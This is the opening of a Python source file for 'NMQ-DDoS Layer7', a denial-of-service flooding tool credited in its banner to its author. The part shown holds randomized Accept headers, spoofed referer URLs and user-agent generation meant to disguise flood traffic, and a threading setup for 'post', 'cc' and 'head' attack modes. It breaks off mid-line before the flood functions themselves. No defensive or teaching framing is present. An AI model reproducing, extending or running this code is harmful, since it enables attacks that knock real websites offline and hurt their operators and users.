#!/usr/bin/python -tt

#Coded by NMQ

#########################################

#         Just a little change          #

#           Nguyễn Minh Quang           #

#########################################

import requests

import socket

import socks

import time

import random

import threading

import sys

import ssl

import datetime

print ('''

                __                      _____

               / /  __ _ _   _  ___ _ _|___  |

              / /  / _` | | | |/ _ \ '__| / /

             / /__| (_| | |_| |  __/ |   / /

             \____/\__,_|\__, |\___|_|  /_/

                          |___/

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

~~~ TOOL NMQ-DDoS Layer7 (DDoS)

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

~~~ Bản Quyền: Nguyễn Minh Quang

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -''')

acceptall = [

		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",		"Accept-Encoding: gzip, deflate\r\n",

		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",

		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",

		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",

		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",

		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",

		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",

		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"

		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",

		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",

		"Accept: text/html, application/xhtml+xml",

		"Accept-Language: en-US,en;q=0.5\r\n",

		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",

		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",]

referers = [

	"https://www.google.com/search?q=",

	"https://check-host.net/",

	"https://www.facebook.com/",

	"https://www.youtube.com/",

	"https://www.fbi.com/",

	"https://www.bing.com/search?q=",

	"https://r.search.yahoo.com/",

	"https://www.cia.gov/index.html",

	"https://vk.com/profile.php?redirect=",

	"https://www.usatoday.com/search/results?q=",

	"https://help.baidu.com/searchResult?keywords=",

	"https://steamcommunity.com/market/search?q=",

	"https://www.ted.com/search?q=",

	"https://play.google.com/store/search?q=",

	"https://www.qwant.com/search?q=",

	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",

	"https://www.google.ad/search?q=",

	"https://www.google.ae/search?q=",

	"https://www.google.com.af/search?q=",

	"https://www.google.com.ag/search?q=",

	"https://www.google.com.ai/search?q=",

	"https://www.google.al/search?q=",

	"https://www.google.am/search?q=",

	"https://www.google.co.ao/search?q=",

]

ind_dict = {}

data = ""

cookies = ""

strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890&"

###################################################

Intn = random.randint

Choice = random.choice

###################################################

def build_threads(mode,thread_num,event,socks_type,ind_rlock):

	if mode == "post":

		for _ in range(thread_num):

			th = threading.Thread(target = post,args=(event,socks_type,ind_rlock,))

			th.setDaemon(True)

			th.start()

	elif mode == "cc":

		for _ in range(thread_num):

			th = threading.Thread(target = cc,args=(event,socks_type,ind_rlock,))

			th.setDaemon(True)

			th.start()

	elif mode == "head":

		for _ in range(thread_num):

			th = threading.Thread(target = head,args=(event,socks_type,ind_rlock,))

			th.setDaemon(True)

			th.start()

def getuseragent():

	platform = Choice(['Macintosh', 'Windows', 'X11'])

	if platform == 'Macintosh':

		os  = Choice(['68K', 'PPC', 'Intel Mac OS X'])

	elif platform == 'Windows':

		os  = Choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows
